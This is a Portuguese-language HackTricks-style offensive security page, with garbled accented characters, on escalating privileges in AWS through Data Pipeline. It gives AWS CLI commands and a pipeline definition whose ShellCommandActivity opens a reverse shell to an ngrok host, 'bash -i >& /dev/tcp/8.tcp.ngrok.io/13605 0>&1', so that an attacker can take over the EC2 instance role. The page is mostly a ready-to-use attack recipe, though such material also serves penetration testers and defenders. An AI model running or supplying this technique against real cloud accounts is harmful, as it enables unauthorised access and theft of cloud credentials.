# AWS - Escala√ß√£o de Privil√©gios do Datapipeline

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

</details>

## datapipeline

Para mais informa√ß√µes sobre datapipeline, consulte:

{% content-ref url="../aws-services/aws-datapipeline-codepipeline-codebuild-and-codecommit.md" %}
[aws-datapipeline-codepipeline-codebuild-and-codecommit.md](../aws-services/aws-datapipeline-codepipeline-codebuild-and-codecommit.md)
{% endcontent-ref %}

### `iam:PassRole`, `datapipeline:CreatePipeline`, `datapipeline:PutPipelineDefinition`, `datapipeline:ActivatePipeline`

Um atacante com as permiss√µes **`iam:PassRole`, `datapipeline:CreatePipeline`,  `datapipeline:PutPipelineDefinition,`** e **`datapipeline:ActivatePipeline`** seria capaz de escalar privil√©gios **criando um pipeline e atualizando-o para executar um comando AWS CLI arbitr√°rio ou criar outros recursos**, uma vez ou em um intervalo com as permiss√µes da fun√ß√£o que foi passada.

```bash
aws datapipeline create-pipeline --name my_pipeline \
    --unique-id unique_string
```

Isso criar√° um pipeline vazio. O atacante ent√£o precisa **atualizar a defini√ß√£o do pipeline** para dizer o que fazer, com um comando como este:

```json
{
     "objects": [
     {
         "id" : "CreateDirectory",
         "type" : "ShellCommandActivity",
         "command" : "bash -c 'bash -i >& /dev/tcp/8.tcp.ngrok.io/13605 0>&1'",
         "runsOn" : {"ref": "instance"}
     },
     {
         "id": "Default",
         "scheduleType": "ondemand",
         "failureAndRerunMode": "CASCADE",
         "name": "Default",
         "role": "assumable_datapipeline",
         "resourceRole": "assumable_datapipeline"
     },
     {
         "id" : "instance",
         "name" : "instance",
         "type" : "Ec2Resource",
         "actionOnTaskFailure" : "terminate",
         "actionOnResourceFailure" : "retryAll",
         "maximumRetries" : "1",
         "instanceType" : "t2.micro",
         "securityGroups" : ["default"],
         "role" : "assumable_datapipeline",
         "resourceRole" : "assumable_ec2_profile_instance"
     }]
}
```

{% hint style="info" %}
Observe que a **fun√ß√£o** nas **linhas 14, 15 e 27** precisa ser uma fun√ß√£o **assum√≠vel por datapipeline.amazonaws.com** e a fun√ß√£o na **linha 28** precisa ser uma **fun√ß√£o assum√≠vel por ec2.amazonaws.com com um perfil EC2 instance**.

Al√©m disso, a inst√¢ncia EC2 ter√° acesso apenas √† fun√ß√£o assum√≠vel pela inst√¢ncia EC2 (portanto, voc√™ s√≥ pode roubar essa).
{% endhint %}

```
aws datapipeline put-pipeline-definition --pipeline-id unique_string \
    --pipeline-definition file:///path/to/my/pipeline/definition.json
```

Onde o **arquivo de defini√ß√£o do pipeline cont√©m uma diretiva para executar um comando** ou criar recursos usando a API da AWS que poderia ajudar o atacante a obter privil√©gios adicionais.

**Impacto Potencial:** Escala√ß√£o direta de privil√©gios para a fun√ß√£o de servi√ßo ec2 especificada.

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

</details>